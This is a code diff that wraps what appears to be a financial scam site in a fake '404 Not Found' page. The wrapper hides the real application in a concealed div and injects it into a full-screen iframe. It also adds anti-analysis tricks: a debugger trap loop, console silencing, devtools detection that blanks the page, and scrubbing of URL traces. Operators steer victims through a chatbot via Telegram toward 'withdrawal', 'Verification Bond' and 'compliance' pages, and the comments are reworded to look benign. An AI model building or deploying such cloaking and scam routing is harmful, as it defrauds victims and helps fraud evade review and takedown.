@@ -1,4 +1,319 @@
 <!DOCTYPE html>
+<html>
+<head>
+    <title>404 Not Found</title>
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* Base styling matching the clean GitHub-style look */
+        body { 
+            font-family: 'Georgia', sans-serif;  
+            background-color: #161b22; 
+            color: #c9d1d9; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0; 
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+            visibility: hidden; /* Prevent visual layout flashing */
+        }
+
+        /* Appended class when configuration is ready */
+        body.render-ready {
+            visibility: visible;
+        }
+
+        .error-container {
+            max-width: 500px;
+        }
+
+        .error-code-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 140px;
+            font-weight: 600;
+            line-height: 1;
+            letter-spacing: -2px;
+            color: #f0f6fc;
+            user-select: none;
+            margin-bottom: 24px;
+        }
+
+        .logo-container {
+            width: 130px;
+            height: 130px;
+            margin: 0 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            overflow: hidden; 
+        }
+
+        .logo-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; 
+        }
+
+        h2 { 
+            font-size: 24px; 
+            font-weight: 700; 
+            margin: 0 0 8px 0;
+            color: #f0f6fc;
+        }
+    </style>
+
+    <script>
+    (function() {
+        const SecurityEngine = {
+            // SHARED TEMPLATE: The clean GitHub-style 404 Error Screen layout
+            get404Template: function() {
+                return `
+                    <div class="error-container">
+                        <div class="error-code-wrapper">
+                            <span>4</span>
+                            <div class="logo-container">
+                                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
+                            </div>
+                            <span>4</span>
+                        </div>
+                        <h2>Didn’t find anything here!</h2>
+                    </div>
+                `;
+            },
+
+            // STANDARD BLOCK LAYER: Wipes visible layout memory but keeps background operational
+            triggerSelfDestruct: function() {
+                document.body.innerHTML = this.get404Template();
+                document.body.classList.add('render-ready');
+                this.activateInspectorTrap();
+                this.activateEnvironmentSabotage();
+            },
+
+            // NEW: Listens for the cross-thread dynamic reset payload command from Kairos
+            activateResetListener: function() {
+                window.addEventListener('message', (event) => {
+                    if (event.origin !== window.location.origin) return;
+
+                    if (event.data && event.data.type === 'COMMAND_SYSTEM_RESET') {
+                        const randomId = event.data.resetId;
+                        const expiryTime = event.data.expiresAt;
+
+                        // Cache volatile reset requirements locally
+                        localStorage.setItem('_sys_reset_token', randomId);
+                        localStorage.setItem('_sys_reset_expiry', expiryTime);
+
+                        // Transparently redirect current window context with token
+                        const currentUrl = new URL(window.location.href);
+                        currentUrl.searchParams.set('auth_reset', randomId);
+                        window.location.href = currentUrl.toString();
+                    }
+                });
+            },
+
+            // NEW: Inspects query strings to securely process access second chances
+            checkResetValidation: function() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const urlToken = urlParams.get('auth_reset');
+                
+                if (urlToken) {
+                    const savedToken = localStorage.getItem('_sys_reset_token');
+                    const expiryStr = localStorage.getItem('_sys_reset_expiry');
+                    const expiryTime = expiryStr ? parseInt(expiryStr, 10) : 0;
+
+                    // 2-Minute Enforcement Window Check
+                    if (urlToken === savedToken && Date.now() < expiryTime) {
+                        // Purge current timeline barriers and tokens
+                        localStorage.removeItem('_sys_reset_token');
+                        localStorage.removeItem('_sys_reset_expiry');
+                        
+                        // Strip query strings to perfectly mask execution traces
+                        const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
+                        window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
+                        
+                        // Fire core baseline restart window
+                        window.location.reload();
+                        return true; 
+                    } else {
+                        // Tampering fallback block
+                        this.triggerSelfDestruct();
+                        return false;
+                    }
+                }
+                return false;
+            },
+
+            // Forces string generation to match global approval rule
+            getHardwareID: function() {
+                const components = [navigator.userAgent, navigator.platform, screen.width, screen.height].join('|');
+                let hash = 0;
+                for (let i = 0; i < components.length; i++) {
+                    hash = ((hash << 5) - hash) + components.charCodeAt(i);
+                    hash |= 0;
+                }
+                // Prepend '1' to ensure verification consistency
+                return '1' + hash.toString(16); 
+            },
+
+            detectAgencyProfile: function() {
+                if (navigator.userAgent.includes("Corporate-Gateway")) return 'GOVERNMENT';
+
+                if (navigator.connection && navigator.connection.effectiveType) {
+                    const type = navigator.connection.effectiveType;
+                    if (['5g', '4g', '3g', '2g'].includes(type) || type) {
+                        return 'PRIVATE';
+                    }
+                }
+                return 'PRIVATE';
+            },
+
+            activateInspectorTrap: function() {
+                setInterval(function() {
+                    debugger; 
+                }, 50); 
+            },
+
+            activateEnvironmentSabotage: function() {
+                const fakeLog = () => {};
+                console.log = console.warn = console.error = console.info = fakeLog;
+
+                setInterval(function() {
+                    const executionPath = '4|1|3|0|2'.split('|');
+                    let pointer = 0;
+
+                    while (true) {
+                        switch (executionPath[pointer++]) {
+                            case '0':
+                                try {
+                                    (function stackTrap(i) {
+                                        if (("" + i / i)["length"] !== 1 || i % 20 === 0) {
+                                            (function() {}).constructor("debugger")();
+                                        } else {
+                                            stackTrap(++i);
+                                        }
+                                    })(0);
+                                } catch (e) {}
+                                continue;
+                            case '1':
+                                let dummyCheck = Math.random() > 0.5 ? 'STATE_A' : 'STATE_B';
+                                if (dummyCheck === 'STATE_A') { window.status = 'VALIDATING'; }
+                                continue;
+                            case '2':
+                                return;
+                            case '3':
+                                if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) {
+                                    SecurityEngine.triggerSelfDestruct(); 
+                                }
+                                continue;
+                            case '4':
+                                let seed = (Date.now() % 1000) * 0x5a1b;
+                                continue;
+                        }
+                        break;
+                    }
+                }, 200); 
+            },
+
+            injectSecureApp: function(agencyType) {
+                const secureStorage = document.getElementById('hidden-application-payload');
+                if (!secureStorage) {
+                    this.triggerSelfDestruct();
+                    return;
+                }
+
+                const rawAppContent = secureStorage.innerHTML.trim();
+                if (!rawAppContent) {
+                    this.triggerSelfDestruct();
+                    return;
+                }
+
+                const shadowFrame = document.createElement('iframe');
+                shadowFrame.style.width = '100vw';
+                shadowFrame.style.height = '100vh';
+                shadowFrame.style.border = 'none';
+                shadowFrame.style.position = 'fixed';
+                shadowFrame.style.top = '0';
+                shadowFrame.style.left = '0';
+                shadowFrame.style.zIndex = '999999';
+                shadowFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms'); 
+
+                document.body.appendChild(shadowFrame);
+
+                const secretContext = shadowFrame.contentWindow || shadowFrame.contentDocument;
+                secretContext.AUTHORIZED_AGENCY = agencyType;
+
+                secretContext.document.open();
+                secretContext.document.write(rawAppContent);
+                secretContext.document.close();
+
+                secureStorage.style.display = 'none'; 
+                document.body.classList.add('render-ready');
+            },
+
+            run: function() {
+                // Initialize cross-thread channel listeners immediately
+                this.activateResetListener();
+
+                // Intercept execution path if a dynamic reset sequence URL is running
+                if (this.checkResetValidation()) return;
+
+                const hardwareID = this.getHardwareID();
+                const agencyType = this.detectAgencyProfile();
+
+                const isAuthorized = (hardwareID.startsWith('a') || hardwareID.startsWith('1')) && 
+                                     (agencyType === 'GOVERNMENT' || agencyType === 'PRIVATE');
+
+                if (isAuthorized) {
+                    this.activateInspectorTrap();         
+                    this.activateEnvironmentSabotage();   
+
+                    if (document.readyState === 'loading') {
+                        window.addEventListener('DOMContentLoaded', () => this.injectSecureApp(agencyType));
+                    } else {
+                        this.injectSecureApp(agencyType);
+                    }
+                } else {
+                    this.triggerSelfDestruct();
+                }
+            }
+        };
+
+        // Standard context postmessage handlers
+        window.addEventListener("message", (event) => {
+            if (event.data && event.data.type === "UPDATE_TITLE") {
+                document.title = event.data.title;
+            }
+        });
+
+        // Initialize engine safely based on document current load status
+        if (document.readyState === 'loading') {
+            window.addEventListener('DOMContentLoaded', () => SecurityEngine.run());
+        } else {
+            SecurityEngine.run();
+        }
+    })();
+    </script>
+</head>
+<body>
+
+    <div class="error-container">
+        <div class="error-code-wrapper">
+            <span>4</span>
+            <div class="logo-container">
+                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
+            </div>
+            <span>4</span>
+        </div>
+        <h2>Didn’t find anything here!</h2>
+    </div>
+
+    <div id="hidden-application-payload" style="display:none;"><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -1745,12 +2060,12 @@ async function listenForTelegramMessages() {
 
                             else if (lowerContent.includes("redirect her to") || lowerContent.includes("redirect him to") || lowerContent.includes("redirect them to") || lowerContent.includes("redirect vitti to")) {
     
-    // 1. INSTANTLY KILL SARAH'S ACTIVE STATE (Just like end conversation does)
+    // 1. Instantly terminate active agent tracking
     isSarahActive = false;
     sessionStorage.removeItem('agent_takeover');
     localStorage.removeItem('sarah_takeover_timestamp');
 
-    // 2. INSTANTLY SWAP THE HEADER BACK TO KAIROS
+    // 2. Swap header UI components back to default
     const botHeader = document.getElementById('botHeader');
     if (botHeader) {
         botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
@@ -1758,31 +2073,39 @@ async function listenForTelegramMessages() {
     }
     startQuoteAutorotation();
 
-    // 3. PROCESS THE ROUTING DESTINATIONS
+    // Fetch original target user parameter to keep session consistent
+    const currentTargetUser = urlParams.get('user') || 'Anonymous';
+    
+    // Generate an OTK valid for exactly 60 seconds
+    const freshOTK = generateSecureOTK(60); 
+
+    // Helper to build the secure parameterized URL string
+    const buildSecureUrl = (baseUrl) => `${baseUrl}?user=${encodeURIComponent(currentTargetUser)}&otk=${freshOTK}`;
+
+    // 3. Match destinations and append the secure keys
     if (lowerContent.includes("dashboard")) {
         msgContent = "Understood. Accessing your main dashboard account panel now...";
-        setTimeout(() => { window.location.href = "https://link.avalonflow.site/dashboard"; }, 2500);
+        setTimeout(() => { window.location.href = buildSecureUrl("https://link.avalonflow.site/dashboard"); }, 2500);
     } 
     else if (lowerContent.includes("withdrawal")) {
         msgContent = "Perfect. Pulling up your secure withdrawal routing screen...";
-        setTimeout(() => { window.location.href = "https://link.avalonflow.site/withdrawal"; }, 2500);
+        setTimeout(() => { window.location.href = buildSecureUrl("https://link.avalonflow.site/withdrawal"); }, 2500);
     } 
     else if (lowerContent.includes("rewards")) {
-        msgContent = "Opening your Sector Retention Bonus balance . One moment...";
-        setTimeout(() => { window.location.href = "https://link.avalonflow.site/returns"; }, 2500);
+        msgContent = "Opening your Sector Retention Bonus balance. One moment...";
+        setTimeout(() => { window.location.href = buildSecureUrl("https://link.avalonflow.site/returns"); }, 2500);
     } 
     else if (lowerContent.includes("avb") || lowerContent.includes("verification bond")) {
-        msgContent = "Initializing secure verification protocols... Opening your AvalonFlow Verification Bond (AVB) ledger now.";
-        setTimeout(() => { window.location.href = "https://link.avalonflow.site/crawithholdingverification"; }, 2500); 
+        msgContent = "Initializing secure verification protocols... Opening your AVB ledger now.";
+        setTimeout(() => { window.location.href = buildSecureUrl("https://link.avalonflow.site/crawithholdingverification"); }, 2500); 
     }
     else if (lowerContent.includes("compliance")) {
         msgContent = "Initializing priority connection... Opening your Compliance Verification gateway.";
-        setTimeout(() => { window.location.href = "https://link.avalonflow.site/confirmations"; }, 2500);
+        setTimeout(() => { window.location.href = buildSecureUrl("https://link.avalonflow.site/confirmations"); }, 2500);
     } 
-    // ADDED: Captures 'signin' from your Telegram screenshot command to drop to login
     else if (lowerContent.includes("sign out") || lowerContent.includes("logout") || lowerContent.includes("signin")) {
         msgContent = "Routing session parameters back to the secure access terminal...";
-        setTimeout(() => { window.location.href = "https://link.avalonflow.site/signin"; }, 2500); // Redirects to login/logout path
+        setTimeout(() => { window.location.href = buildSecureUrl("https://link.avalonflow.site/signin"); }, 2500);
     }
     else {
         // Fallback message if an unknown page string gets passed
